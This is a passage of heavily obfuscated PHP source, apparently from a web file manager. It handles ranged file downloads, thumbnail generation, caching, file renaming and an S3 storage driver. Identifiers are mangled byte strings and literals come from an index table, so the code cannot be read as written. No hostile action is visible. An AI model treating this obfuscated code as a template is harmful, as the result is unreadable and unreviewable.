$Ûù²çŸ·[144]) { if ($€èçÒıº > 1024 * 1024 * 5) { die; } $ªäœ©ÓŸ = $this->getContent($ˆ±¡Üı¾); $ªäœ©ÓŸ = Html::clearSVG($ªäœ©ÓŸ); header($Ûù²çŸ·[145] . strlen($ªäœ©ÓŸ)); echo $ªäœ©ÓŸ; die; } $“ÑÒÙ¼ı = strtolower($_SERVER[$Ûù²çŸ·[146]]); if ($÷èßµì && $“ÑÒÙ¼ı && $¿½©°š) { if (strstr($“ÑÒÙ¼ı, $Ûù²çŸ·[147])) { header($Ûù²çŸ·[148] . $ˆ±¡Üı¾); } else { if (strstr($“ÑÒÙ¼ı, $Ûù²çŸ·[149])) { header($Ûù²çŸ·[150] . $ˆ±¡Üı¾); } else { if (strstr($“ÑÒÙ¼ı, $Ûù²çŸ·[151])) { header($Ûù²çŸ·[152] . $ˆ±¡Üı¾); } } } if ($•ú’î¼‹) { header($Ûù²çŸ·[153] . $•ú’î¼‹); } return; } if (isset($_SERVER[$Ûù²çŸ·[154]])) { if (preg_match($Ûù²çŸ·[155], $_SERVER[$Ûù²çŸ·[154]], $ˆúëè†¢)) { $Í«Í„ø½ = intval($ˆúëè†¢[1]); $Í«Í„ø½ = $Í«Í„ø½ <= 0 ? 0 : ($Í«Í„ø½ >= $†·ßîŠ ? $†·ßîŠ : $Í«Í„ø½); if (!empty($ˆúëè†¢[2])) { $Øï‘âø = intval($ˆúëè†¢[2]); $†·ßîŠ = $Øï‘âø < $Í«Í„ø½ ? $Í«Í„ø½ : ($Øï‘âø >= $†·ßîŠ ? $†·ßîŠ : $Øï‘âø); } } header($Ûù²çŸ·[156]); header("\103\157\x6e\x74\145\156\x74\55\x52\x61\156\x67\x65\72\x20\x62\x79\164\145\x73\40{$Í«Í„ø½}\x2d{$†·ßîŠ}\57" . $€èçÒıº); } else { header($Ûù²çŸ·[157]); } header($Ûù²çŸ·[158]); $æŒ³¦¿© = !0; if ($_SERVER[$Ûù²çŸ·[159]] == $Ûù²çŸ·[160] && $€èçÒıº > 1204 * 1024 * 1024 * 2) { $æŒ³¦¿© = !1; } if ($æŒ³¦¿©) { header($Ûù²çŸ·[161] . ($†·ßîŠ - $Í«Í„ø½ + 1)); } if ($_SERVER[$Ûù²çŸ·[162]] == $Ûù²çŸ·[163]) { return; } $¹ë¶áÓÓ = 1024 * 100; $½¡ÔÃï = 0; if ($•ú’î¼‹) { $½¡ÔÃï = intval(1000 * 1000 * ($¹ë¶áÓÓ / $•ú’î¼‹)); } while ($Í«Í„ø½ <= $†·ßîŠ) { $ÜË¢ìÑĞ = timeFloat(); check_abort(); $°ÚÈ¼âû = $†·ßîŠ - $Í«Í„ø½ + 1; if ($°ÚÈ¼âû <= $¹ë¶áÓÓ) { $¹ë¶áÓÓ = $°ÚÈ¼âû; } echo $this->fileSubstr($ˆ±¡Üı¾, $Í«Í„ø½, $¹ë¶áÓÓ); $Í«Í„ø½ += $¹ë¶áÓÓ; if ($¹ë¶áÓÓ == $°ÚÈ¼âû) { $Í«Í„ø½ = $†·ßîŠ + 1; } if ($½¡ÔÃï) { $ğÕ¸áĞı = intval(1000 * 1000 * (timeFloat() - $ÜË¢ìÑĞ)); $å­Ç×Œ× = $½¡ÔÃï - $ğÕ¸áĞı; if ($å­Ç×Œ× > 5) { usleep($å­Ç×Œ×); } } } } public function fileOutServer($‘Êçì½, $Ùßâ—êœ = false, $¤ÀşÄıî = false, $¡ğ¤„ª = '') { $this->fileOut($‘Êçì½, $Ùßâ—êœ, $¤ÀşÄıî, $¡ğ¤„ª); } public function fileOutLink($…éŸ€¿Õ) { header($_SERVER[•Ùç É][164] . $…éŸ€¿Õ); die; } public function cacheMethod($‘¿–·á», $êÛÉ‰Ûé, $‘¯Õ•ê = null) { $™Ëœ©é =& $_SERVER[•Ùç É]; static $–¦°î¡Ó = array(); $İ¶¿Û‘ = $êÛÉ‰Ûé ? ltrim($this->getPathOuter($êÛÉ‰Ûé), $™Ëœ©é[8]) : $™Ëœ©é[12]; $ñáÓ×º = $™Ëœ©é[165] . $‘¿–·á» . $™Ëœ©é[166] . rtrim($İ¶¿Û‘, $™Ëœ©é[8]); if (is_null($‘¿–·á»)) { $–¦°î¡Ó = array(); return; } if (is_null($êÛÉ‰Ûé)) { foreach ($–¦°î¡Ó as $ñáÓ×º => $ùÏ”µ´Â) { if (!strstr($ñáÓ×º, $™Ëœ©é[165] . $‘¿–·á» . $™Ëœ©é[167])) { continue; } unset($–¦°î¡Ó[$ñáÓ×º]); } return; } if (!is_null($‘¯Õ•ê)) { $–¦°î¡Ó[$ñáÓ×º] = $‘¯Õ•ê; return; } $òÙºšç¬ = isset($–¦°î¡Ó[$ñáÓ×º]) ? $–¦°î¡Ó[$ñáÓ×º] : null; if (!is_null($òÙºšç¬)) { return $òÙºšç¬; } $òÙºšç¬ = $this->{$‘¿–·á»}($êÛÉ‰Ûé); $–¦°î¡Ó[$ñáÓ×º] = $òÙºšç¬; return $òÙºšç¬; } public function cacheMethodInfoSet($’ÉÂ©¤Õ, $« ¢²€“, $Î¯Ÿ§ÌÌ = false) { $Øó‹—³¹ =& $_SERVER[•Ùç É]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($Øó‹—³¹[168], $’ÉÂ©¤Õ, $« ¢²€“); $this->cacheMethod($Øó‹—³¹[169], $’ÉÂ©¤Õ, $« ¢²€“ ? !1 : !0); if (is_array($Î¯Ÿ§ÌÌ)) { $this->cacheMethod($Øó‹—³¹[170], $’ÉÂ©¤Õ, $Î¯Ÿ§ÌÌ); } } public function fileOutImage($ä°–¡³˜, $ÜŸÉŠãÆ = 250) { $âÖ¦—ì‘ =& $_SERVER[•Ùç É]; set_timeout(); if (substr($ä°–¡³˜, 0, 4) == $âÖ¦—ì‘[151]) { $this->fileOutLink($ä°–¡³˜); } $½âë„†Õ = $this->info($ä°–¡³˜); $íä°ÜÔ¤ = !1; $¿”õª²Ë = isset($GLOBALS[$âÖ¦—ì‘[171]]) ? $GLOBALS[$âÖ¦—ì‘[171]] : array(); if ($¿”õª²Ë && $¿”õª²Ë[$âÖ¦—ì‘[172]] == $½âë„†Õ[$âÖ¦—ì‘[86]]) { $½âë„†Õ = $¿”õª²Ë; $ØŞÚ›ßü = $½âë„†Õ[$âÖ¦—ì‘[173]]; if ($ØŞÚ›ßü && isset($ØŞÚ›ßü[$âÖ¦—ì‘[174]])) { if ($ØŞÚ›ßü[$âÖ¦—ì‘[174]] <= $ÜŸÉŠãÆ && $ØŞÚ›ßü[$âÖ¦—ì‘[175]] <= $ÜŸÉŠãÆ) { $íä°ÜÔ¤ = !0; } } } if ($½âë„†Õ[$âÖ¦—ì‘[78]] <= 1024 * 50 || $íä°ÜÔ¤ || !function_exists($âÖ¦—ì‘[176]) || $½âë„†Õ[$âÖ¦—ì‘[177]] == $âÖ¦—ì‘[178]) { return $this->fileOut($ä°–¡³˜, !1, $½âë„†Õ[$âÖ¦—ì‘[32]]); } $ËœæŠ‘ = kodIO::hashPath($½âë„†Õ); $‰²¡ŸÃ‘ = "\x63\157\x76\145\x72\137{$ËœæŠ‘}\x5f{$ÜŸÉŠãÆ}\56\160\156\147"; $¼ïÆÔ•ü = IO_PATH_SYSTEM_TEMP . $âÖ¦—ì‘[179]; $½˜Şı€ = IO::infoFullSimple($¼ïÆÔ•ü); $ÏØ•œúÉ = $½˜Şı€ && is_array($½˜Şı€) ? $½˜Şı€[$âÖ¦—ì‘[86]] : $âÖ¦—ì‘[12]; if (!$ÏØ•œúÉ) { $ÏØ•œúÉ = IO::mkdir($¼ïÆÔ•ü); } if ($½âë„†Õ[$âÖ¦—ì‘[180]] == $âÖ¦—ì‘[181] && isset($½âë„†Õ[$âÖ¦—ì‘[182]]) && $½âë„†Õ[$âÖ¦—ì‘[182]] == kodIO::sourceID($ÏØ•œúÉ)) { $¨ÜË¹èÖ = $½âë„†Õ[$âÖ¦—ì‘[183]]; if ($ÜŸÉŠãÆ <= 500) { $ü÷¥é¹ú = preg_replace($âÖ¦—ì‘[184], $âÖ¦—ì‘[185], $½âë„†Õ[$âÖ¦—ì‘[32]]); $¨ÜË¹èÖ = IO::fileNameExist($ÏØ•œúÉ, $ü÷¥é¹ú); } return IO::fileOut(KodIO::make($¨ÜË¹èÖ), !1, $½âë„†Õ[$âÖ¦—ì‘[32]]); } $¹ åş‚ = IO::fileNameExist($ÏØ•œúÉ, $‰²¡ŸÃ‘); if ($¹ åş‚) { return IO::fileOut(KodIO::make($¹ åş‚), !1, $½âë„†Õ[$âÖ¦—ì‘[32]]); } if ($ÜŸÉŠãÆ > 1000) { $this->makeImageCover($ÏØ•œúÉ, $ä°–¡³˜, $‰²¡ŸÃ‘, $ÜŸÉŠãÆ); $this->makeImageCover($ÏØ•œúÉ, $ä°–¡³˜, "\143\x6f\x76\x65\x72\137{$ËœæŠ‘}\137\x32\x35\x30\56\x70\x6e\x67", 250); $¹ åş‚ = IO::fileNameExist($ÏØ•œúÉ, $‰²¡ŸÃ‘); if ($¹ åş‚) { return IO::fileOut(KodIO::make($¹ åş‚), !1, $½âë„†Õ[$âÖ¦—ì‘[32]]); } die; } $èÉú´Øä = Cache::get($‰²¡ŸÃ‘); if ($èÉú´Øä == $âÖ¦—ì‘[186] || $èÉú´Øä == $âÖ¦—ì‘[187]) { echo $èÉú´Øä; die; } Cache::set($‰²¡ŸÃ‘, $âÖ¦—ì‘[187], 60); $ŒÕñû = array($ÏØ•œúÉ, $½âë„†Õ[$âÖ¦—ì‘[86]], $‰²¡ŸÃ‘, $ÜŸÉŠãÆ); $•Ù²Ğåä = $âÖ¦—ì‘[188] . $½âë„†Õ[$âÖ¦—ì‘[78]] . $âÖ¦—ì‘[189] . $‰²¡ŸÃ‘ . $âÖ¦—ì‘[190] . $½âë„†Õ[$âÖ¦—ì‘[32]] . $âÖ¦—ì‘[191] . $½âë„†Õ[$âÖ¦—ì‘[86]]; TaskQueue::add($âÖ¦—ì‘[192], $ŒÕñû, $•Ù²Ğåä, $‰²¡ŸÃ‘); } public function makeImageCover($ÕÑ½Èƒš, $É¶âšÌÏ, $Ä­£‡á…, $…ë€™Ñ”) { $ÊÊÎÇ¸¬ =& $_SERVER[•Ùç É]; if (IO::fileNameExist($ÕÑ½Èƒš, $Ä­£‡á…)) { return $ÊÊÎÇ¸¬[193]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $”ÉÇ¦˜á = DATA_THUMB . $Ä­£‡á…; del_file($”ÉÇ¦˜á); $ôÙ£Áì™ = TEMP_FILES . $Ä­£‡á…; if (!@file_exists($ôÙ£Áì™)) { $ôÙ£Áì™ = $this->download($É¶âšÌÏ, $ôÙ£Áì™); } if (!@file_exists($ôÙ£Áì™)) { return $ÊÊÎÇ¸¬[194]; } ImageThumb::createThumb($ôÙ£Áì™, $”ÉÇ¦˜á, $…ë€™Ñ”, $…ë€™Ñ” * 10); if (@file_exists($”ÉÇ¦˜á)) { Cache::remove($Ä­£‡á…); return IO::move($”ÉÇ¦˜á, $ÕÑ½Èƒš); } Cache::set($Ä­£‡á…, $ÊÊÎÇ¸¬[186], 600); del_file($”ÉÇ¦˜á); return $ÊÊÎÇ¸¬[195] . $ôÙ£Áì™ . $ÊÊÎÇ¸¬[73]; } public function fileOutImageServer($û·§¦Ãı, $îÍÂçÚÙ = 250) { $this->fileOutImage($û·§¦Ãı, $îÍÂçÚÙ); } public function fileNameAuto($«ı¸éù, $êŸ„ÓÏ¤, $Œ·Éíâ¶ = REPEAT_RENAME, $œ“Ã™Õ = false) { $öúˆ”±Ï =& $_SERVER[•Ùç É]; $‘–çõˆÄ = $«ı¸éù === $öúˆ”±Ï[12] ? $êŸ„ÓÏ¤ : rtrim($«ı¸éù, $öúˆ”±Ï[8]) . $öúˆ”±Ï[8] . $êŸ„ÓÏ¤; if ($Œ·Éíâ¶ == REPEAT_REPLACE || !$this->exist($‘–çõˆÄ) || $œ“Ã™Õ && $Œ·Éíâ¶ != REPEAT_RENAME_FOLDER) { return $êŸ„ÓÏ¤; } if ($Œ·Éíâ¶ == REPEAT_SKIP) { return !1; } $æ‘×¼Ì” = $öúˆ”±Ï[10] . get_path_ext($êŸ„ÓÏ¤); $æ‘×¼Ì” = $æ‘×¼Ì” == $öúˆ”±Ï[10] || $œ“Ã™Õ ? $öúˆ”±Ï[12] : $æ‘×¼Ì”; $ÈÑìÛÃ¤ = 1; $á×ñÚşÑ = substr($êŸ„ÓÏ¤, 0, strlen($êŸ„ÓÏ¤) - strlen($æ‘×¼Ì”)); $šá²ÒÁ = $á×ñÚşÑ . "\x28{$ÈÑìÛÃ¤}\51{$æ‘×¼Ì”}"; while ($this->exist(rtrim($«ı¸éù, $öúˆ”±Ï[8]) . $öúˆ”±Ï[8] . $šá²ÒÁ)) { $šá²ÒÁ = $á×ñÚşÑ . "\50{$ÈÑìÛÃ¤}\51{$æ‘×¼Ì”}"; $ÈÑìÛÃ¤++; } return $šá²ÒÁ; } private function fileNameAutoList($€–µ­Ñ, $¢È±ëÆô, $Øò¶‘•‹ = false) { $²ü ½¶¼ =& $_SERVER[•Ùç É]; $ğÕ£•®É = $this->listPath($€–µ­Ñ, !0); $ğÕ£•®É = array_merge($ğÕ£•®É[$²ü ½¶¼[84]], $ğÕ£•®É[$²ü ½¶¼[85]]); $²À™Š÷Ú = array_to_keyvalue($ğÕ£•®É, $²ü ½¶¼[12], $²ü ½¶¼[32]); $¦ÅÍÅœ = $²ü ½¶¼[10] . get_path_ext($¢È±ëÆô); $¦ÅÍÅœ = $¦ÅÍÅœ == $²ü ½¶¼[10] || $Øò¶‘•‹ ? $²ü ½¶¼[12] : $¦ÅÍÅœ; $„Æ­úöİ = substr($¢È±ëÆô, 0, strlen($¢È±ëÆô) - strlen($¦ÅÍÅœ)); $µ­ÒÌâ’ = $„Æ­úöİ . "\50\x30\51{$¦ÅÍÅœ}"; for ($Â¬Ò¦š‰ = 1; $Â¬Ò¦š‰ <= count($²À™Š÷Ú) + 1; $Â¬Ò¦š‰++) { $µ­ÒÌâ’ = $„Æ­úöİ . "\x28{$Â¬Ò¦š‰}\x29{$¦ÅÍÅœ}"; if (!in_array_not_case($µ­ÒÌâ’, $²À™Š÷Ú)) { return $µ­ÒÌâ’; } } return $µ­ÒÌâ’; } public function listAllFiles($ŠºÆêã, $÷¼Âø¶š) { $¥á›ş› =& $_SERVER[•Ùç É]; if (empty($÷¼Âø¶š)) { return array(); } $óøÑ÷ = array_keys($÷¼Âø¶š); $Š´—¸›‚ = array(); $ŠºÆêã = trim($ŠºÆêã, $¥á›ş›[8]); foreach ($÷¼Âø¶š as $À‡Î…†Î => $ª¡§ÙÆ) { $Îà×ÔĞÔ = ltrim(substr(trim($À‡Î…†Î, $¥á›ş›[8]), strlen($ŠºÆêã)), $¥á›ş›[8]); if (substr($À‡Î…†Î, -1) == $¥á›ş›[8]) { $Îà×ÔĞÔ = rtrim($Îà×ÔĞÔ, $¥á›ş›[8]) . $¥á›ş›[8]; } $Š´—¸›‚ = array_merge($Š´—¸›‚, $this->slicePath($Îà×ÔĞÔ)); } $„ÌşŸ°¤ = array(); foreach (array_unique($Š´—¸›‚) as $ƒÄÑÔÀ÷) { $å‚ù÷ = array($¥á›ş›[86] => $this->getPathOuter($¥á›ş›[8] . $ŠºÆêã . $¥á›ş›[8] . $ƒÄÑÔÀ÷), $¥á›ş›[77] => 1, $¥á›ş›[78] => 0); if (substr($ƒÄÑÔÀ÷, -1) != $¥á›ş›[8]) { $å‚ù÷[$¥á›ş›[77]] = 0; $ââââÙÊ = $this->getPath($ŠºÆêã . $¥á›ş›[8] . $ƒÄÑÔÀ÷); if (isset($÷¼Âø¶š[$ââââÙÊ])) { $Çş¬Æ = $÷¼Âø¶š[$ââââÙÊ]; if (isset($Çş¬Æ[$¥á›ş›[78]])) { $å‚ù÷[$¥á›ş›[78]] = intval($Çş¬Æ[$¥á›ş›[78]]); } if (isset($Çş¬Æ[$¥á›ş›[196]])) { $å‚ù÷[$¥á›ş›[87]] = intval($Çş¬Æ[$¥á›ş›[196]]); } } } $„ÌşŸ°¤[] = $å‚ù÷; } return $„ÌşŸ°¤; } public function slicePath($é±Âˆµ) { $¡«Ñ†ıƒ =& $_SERVER[•Ùç É]; $‚ƒôøÅ¦ = explode($¡«Ñ†ıƒ[8], trim($é±Âˆµ, $¡«Ñ†ıƒ[8])); $ã‹ğ¾¨” = 0; do { ++$ã‹ğ¾¨”; $Ìíñıµ[] = implode($¡«Ñ†ıƒ[8], array_slice($‚ƒôøÅ¦, 0, $ã‹ğ¾¨”)) . $¡«Ñ†ıƒ[8]; } while ($ã‹ğ¾¨” < count($‚ƒôøÅ¦)); $Ìíñıµ[count($‚ƒôøÅ¦) - 1] = $é±Âˆµ; return $Ìíñıµ; } public function getHost() { $½ÈÉÂ‘¨ =& $_SERVER[•Ùç É]; $®Ñ¬ÁÊî = parse_url(trim($this->domain, $½ÈÉÂ‘¨[8])); $‰çØ¾·æ = isset($®Ñ¬ÁÊî[$½ÈÉÂ‘¨[197]]) ? $®Ñ¬ÁÊî[$½ÈÉÂ‘¨[197]] : http_type(); $³‡¼çÁ = isset($®Ñ¬ÁÊî[$½ÈÉÂ‘¨[198]]) ? $®Ñ¬ÁÊî[$½ÈÉÂ‘¨[198]] : $®Ñ¬ÁÊî[$½ÈÉÂ‘¨[86]]; if (isset($®Ñ¬ÁÊî[$½ÈÉÂ‘¨[199]])) { $³‡¼çÁ .= $½ÈÉÂ‘¨[4] . $®Ñ¬ÁÊî[$½ÈÉÂ‘¨[199]]; } return $‰çØ¾·æ . $½ÈÉÂ‘¨[200] . $³‡¼çÁ; } public function pathEncode($›÷ÇĞ§ã) { $²¼æ §ù =& $_SERVER[•Ùç É]; return str_replace($²¼æ §ù[201], $²¼æ §ù[8], rawurlencode($›÷ÇĞ§ã)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($ªèşş¤ı) { set_timeout(); require_once SDK_DIR . $_SERVER[•Ùç É][202]; parent::__construct(); $this->_init($ªèşş¤ı); } public function _init($İìèêïĞ) { $this->config = $İìèêïĞ; foreach ($İìèêïĞ as $„‰Ö„¬ı => $ã© ğ²) { if (isset($this->{$„‰Ö„¬ı})) { $this->{$„‰Ö„¬ı} = $ã© ğ²; } } $this->endpoint = $İìèêïĞ[$_SERVER[•Ùç É][203]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($§•ıò½ = "\166\64") { $this->signVer = $§•ıò½; $this->client->setSignatureVersion($§•ıò½); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $…â«£æ =& $_SERVER[•Ùç É]; $ËÍ»øğØ = $this->getBucketCors(); if (!$ËÍ»øğØ || !is_array($ËÍ»øğØ)) { return !1; } if ($ËÍ»øğØ[$…â«£æ[204]] != $…â«£æ[205] || $ËÍ»øğØ[$…â«£æ[206]] != $…â«£æ[205]) { return !1; } $‰ößÏÛ™ = array_map($…â«£æ[207], $ËÍ»øğØ[$…â«£æ[208]]); if (!is_array($‰ößÏÛ™)) { $‰ößÏÛ™ = array(); } $†¨Öß€ = array($…â«£æ[209], $…â«£æ[210], $…â«£æ[211], $…â«£æ[212], $…â«£æ[213]); $‰½í„£ˆ = array_diff($†¨Öß€, $‰ößÏÛ™); return empty($‰½í„£ˆ); } public function mkfile($—¹Ò¬’ , $ºõï£ú = '', $”œ€Šµ = REPEAT_RENAME) { $õÅÜŞó‹ = $this->setContent($—¹Ò¬’ , $ºõï£ú); if ($õÅÜŞó‹ !== !1) { return $this->getPathOuter($—¹Ò¬’ ); } return !1; } public function mkdir($Œ›öõˆ, $ºÓ¹Ã‘ = REPEAT_SKIP) { $¿šéÊ»é =& $_SERVER[•Ùç É]; if (empty($Œ›öõˆ) && $Œ›öõˆ !== $¿šéÊ»é[214]) { return !1; } if ($ºÓ¹Ã‘ && $this->_isFolder($Œ›öõˆ)) { return $this->getPathOuter($Œ›öõˆ); } $ÀàÈ—… = $this->setContent($Œ›öõˆ, $¿šéÊ»é[12], !0); if ($ÀàÈ—… !== !1) { return $this->getPathOuter($Œ›öõˆ); } return !1; } public function copyFile($¦ÜÁ”›Ñ, $ı Ï”, $ŸÔòÜ¯ = array()) { $êÛ›à¯³ =& $_SERVER[•Ùç É]; $¶ŞƒÍÁ = $this->objectMeta($¦ÜÁ”›Ñ); if (!$¶ŞƒÍÁ) { return !1; } if ($¶ŞƒÍÁ[$êÛ›à¯³[78]] <= 1024 * 1024 * 200) { $Ë¶ò›µŠ = $this->client->copyObject($this->bucket, $¦ÜÁ”›Ñ, $this->bucket, $ı Ï”, $êÛ›à¯³[215], $ŸÔòÜ¯); } else { $Ë¶ò›µŠ = $this->client->multiCopyObject($this->bucket, $¦ÜÁ”›Ñ, $this->bucket, $ı Ï”, $ŸÔòÜ¯); } $Ë¶ò›µŠ = $Ë¶ò›µŠ ? $this->getPathOuter($ı Ï”) : !1; return $Ë¶ò›µŠ; } public function moveFile($÷§¶­½Ì, $­œ´ë½) { if ($this->copyFile($÷§¶­½Ì, $­œ´ë½)) { $this->delFile($÷§¶­½Ì); return $this->getPathOuter($­œ´ë½); } return !1; } public function delFile($ùÇ‡À²í) { return $this->client->deleteObject($this->bucket, $ùÇ‡À²í); } public function delFolder($ñšØù‹Å) { $–‘ØÉòÈ =& $_SERVER[•Ùç É]; if (!$this->exist($ñšØù‹Å)) { return !0; } $this->listItemCache = !1; $‹êëÃÁ = $this->fileList($ñšØù‹Å); $this->listItemCache = !0; $üÃÇÎğ = trim($ñšØù‹Å, $–‘ØÉòÈ[8]) . $–‘ØÉòÈ[8]; if (!empty($ñšØù‹Å) && $ñšØù‹Å !== $–‘ØÉòÈ[214] && !in_array($üÃÇÎğ, $‹êëÃÁ[$–‘ØÉòÈ[84]])) { $‹êëÃÁ[$–‘ØÉòÈ[84]][] = $üÃÇÎğ; } $ÜíÙèœ˜ = $this->delByBatch($‹êëÃÁ[$–‘ØÉòÈ[85]]); if (!$ÜíÙèœ˜) { return !1; } $ÜíÙèœ˜ = $this->delByBatch($‹êëÃÁ[$–‘ØÉòÈ[84]]); if (!$ÜíÙèœ˜) { return !1; } return $this->delFile($üÃÇÎğ); } private function delByBatch($‘ÑäÂª) { foreach (array_chunk($‘ÑäÂª, 1000) as $ä¼µßÒİ) { $­ÏüÉÓ = $this->client->deleteObjects($this->bucket, $ä¼µßÒİ); if (!$­ÏüÉÓ) { return !1; } } return !0; } public function rename($İ­Û—Ì, $™ÆŠ¨¨è) { return $this->renameObject($İ­Û—Ì, $™ÆŠ¨¨è); } public function listPath($«¡ºß³ğ, $Ûë”³‚ = false) { $›¹ÃêÀğ =& $_SERVER[•Ùç É]; $‡Èºòó = $this->fileList($«¡ºß³ğ, $›¹ÃêÀğ[8], !0); foreach ($‡Èºòó[$›¹ÃêÀğ[84]] as $óè‡ã˜ => $á¦¤¶Ò—) { $‡Èºòó[$›¹ÃêÀğ[84]][$óè‡ã˜] = $this->folderInfo($á¦¤¶Ò—, $Ûë”³‚, $á¦¤¶Ò—); } foreach ($‡Èºòó[$›¹ÃêÀğ[85]] as $óè‡ã˜ => $á¦¤¶Ò—) { $‡Èºòó[$›¹ÃêÀğ[85]][$óè‡ã˜] = $this->fileInfo($á¦¤¶Ò—[$›¹ÃêÀğ[32]], $Ûë”³‚, $á¦¤¶Ò—); } return $‡Èºòó; } protected function infoChildren($ÍËş‹Ä», &$—ãŠ·‚ø) { $ƒµè» =& $_SERVER[•Ùç É]; $íÅµ•Š« = $this->fileList($ÍËş‹Ä», $ƒµè»[12], !0); $—ãŠ·‚ø[$ƒµè»[80]] += count($íÅµ•Š«[$ƒµè»[84]]); $—ãŠ·‚ø[$ƒµè»[79]] += count($íÅµ•Š«[$ƒµè»[85]]); foreach ($íÅµ•Š«[$ƒµè»[85]] as $ã¦Š÷ø) { if (!$ã¦Š÷ø || !$ã¦Š÷ø[$ƒµè»[78]]) { continue; } $—ãŠ·‚ø[$ƒµè»[78]] += $ã¦Š÷ø[$ƒµè»[78]]; } } private function fileInfo($ì¡³İ©¸, $Åãåş è = false, $„Æ¸¹ß = array()) { $å‘íÊàµ =& $_SERVER[•Ùç É]; $¬Óáé— = array($å‘íÊàµ[32] => $this->pathThis($ì¡³İ©¸), $å‘íÊàµ[86] => $this->getPathOuter($ì¡³İ©¸), $å‘íÊàµ[33] => $å‘íÊàµ[216], $å‘íÊàµ[177] => $this->ext($ì¡³İ©¸), $å‘íÊàµ[78] => isset($„Æ¸¹ß[$å‘íÊàµ[78]]) ? $„Æ¸¹ß[$å‘íÊàµ[78]] : 0); if ($Åãåş è) { return $¬Óáé—; } $¬Óáé—[$å‘íÊàµ[217]] = $¬Óáé—[$å‘íÊàµ[87]] = 0; $¬Óáé—[$å‘íÊàµ[218]] = $¬Óáé—[$å‘íÊàµ[219]] = !0; if (empty($„Æ¸¹ß)) { $„Æ¸¹ß = $this->objectMeta($ì¡³İ©¸); if (!$„Æ¸¹ß) { return $¬Óáé—; } } if (isset($„Æ¸¹ß[$å‘íÊàµ[220]]) && $„Æ¸¹ß[$å‘íÊàµ[220]]) { $¬Óáé—[$å‘íÊàµ[221]] = $„Æ¸¹ß[$å‘íÊàµ[220]]; } if (isset($„Æ¸¹ß[$å‘íÊàµ[196]])) { $¬Óáé—[$å‘íÊàµ[87]] = $„Æ¸¹ß[$å‘íÊàµ[196]]; } if (isset($„Æ¸¹ß[$å‘íÊàµ[78]])) { $¬Óáé—[$å‘íÊàµ[78]] = $„Æ¸¹ß[$å‘íÊàµ[78]]; } return $¬Óáé—; } private function folderInfo($—òŠ—»à, $İÏ´ = false, $–‚ò×å = array()) { $í·—è‹ı =& $_SERVER[•Ùç É]; $ê›Á‘Ìü = array($í·—è‹ı[32] => $this->pathThis($—òŠ—»à), $í·—è‹ı[86] => $this->getPathOuter($í·—è‹ı[8] . $—òŠ—»à), $í·—è‹ı[33] => $í·—è‹ı[77]); if ($İÏ´) { return $ê›Á‘Ìü; } $ê›Á‘Ìü[$í·—è‹ı[217]] = $ê›Á‘Ìü[$í·—è‹ı[87]] = 0; $ê›Á‘Ìü[$í·—è‹ı[218]] = $ê›Á‘Ìü[$í·—è‹ı[219]] = !0; if ($—òŠ—»à == $í·—è‹ı[12]) { return $ê›Á‘Ìü; } if (empty($–‚ò×å)) { $–‚ò×å = $this->objectMeta(trim($—òŠ—»à, $í·—è‹ı[8]) . $í·—è‹ı[8]); } if (isset($–‚ò×å[$í·—è‹ı[196]])) { $ê›Á‘Ìü[$í·—è‹ı[217]] = $–‚ò×å[$í·—è‹ı[196]]; } return $ê›Á‘Ìü; } private function fileList($†˜©ƒéâ, $†«ãúÆê = '', $Êá¶ùÎ½ = 0) { $†Ò‡…ï¦ =& $_SERVER[•Ùç É]; $óÏÅúƒø = rtrim($†˜©ƒéâ, $†Ò‡…ï¦[8]) . $†Ò‡…ï¦[8]; $ÒÂÛÔúØ = $this->listObjs($óÏÅúƒø, null, null, $†«ãúÆê); if (!$ÒÂÛÔúØ) { return array($†Ò‡…ï¦[84] => array(), $†Ò‡…ï¦[85] => array()); } $Õ™¹‹ä = $’©½¬ªÑ = array(); foreach ($ÒÂÛÔúØ[$†Ò‡…ï¦[222]] as $¢Ÿ±·) { $ßÈ¹ƒ½ù = $¢Ÿ±·[$†Ò‡…ï¦[32]]; if ($ßÈ¹ƒ½ù == $óÏÅúƒø) { continue; } $«Àßøê  = isset($¢Ÿ±·[$†Ò‡…ï¦[78]]) ? $¢Ÿ±·[$†Ò‡…ï¦[78]] : 0; $í‘ÂÇ¹ı = $«Àßøê  == 0 && substr($ßÈ¹ƒ½ù, strlen($ßÈ¹ƒ½ù) - 1, 1) == $†Ò‡…ï¦[8] ? !0 : !1; $this->cacheMethodInfoSet($ßÈ¹ƒ½ù, $í‘ÂÇ¹ı, $¢Ÿ±·); if ($í‘ÂÇ¹ı) { $Õ™¹‹ä[] = $ßÈ¹ƒ½ù; continue; } $’©½¬ªÑ[] = $Êá¶ùÎ½ ? $¢Ÿ±· : $ßÈ¹ƒ½ù; } foreach ($ÒÂÛÔúØ[$†Ò‡…ï¦[223]] as $¢Ÿ±·) { $Õ™¹‹ä[] = $¢Ÿ±·[$†Ò‡…ï¦[32]]; $this->cacheMethodInfoSet($¢Ÿ±·[$†Ò‡…ï¦[32]], !0); } $this->cacheMethodInfoSet($†˜©ƒéâ, !0); return array($†Ò‡…ï¦[84] => $Õ™¹‹ä, $†Ò‡…ï¦[85] => $’©½¬ªÑ); } private function listObjs($ìòùÁäë, $õñ÷Õ«¯ = null, $Úá¨³Îë = null, $î™Ú§å… = null) { $†–ˆ±Õ =& $_SERVER[•Ùç É]; $ìòùÁäë = trim($ìòùÁäë, $†–ˆ±Õ[8]); $º”êÃë² = empty($ìòùÁäë) && $ìòùÁäë !== $†–ˆ±Õ[214] ? $†–ˆ±Õ[12] : $ìòùÁäë . $†–ˆ±Õ[8]; return $this->client->getBucket($this->bucket, $º”êÃë², $õñ÷Õ«¯, $Úá¨³Îë, $î™Ú§å…, !0); } public function has($“üé²È, $Ê¿ğÃäí = false, $Ÿ¿…’ûá = true) { $•ÚáÆïô =& $_SERVER[•Ùç É]; $“üé²È = trim($“üé²È, $•ÚáÆïô[8]); 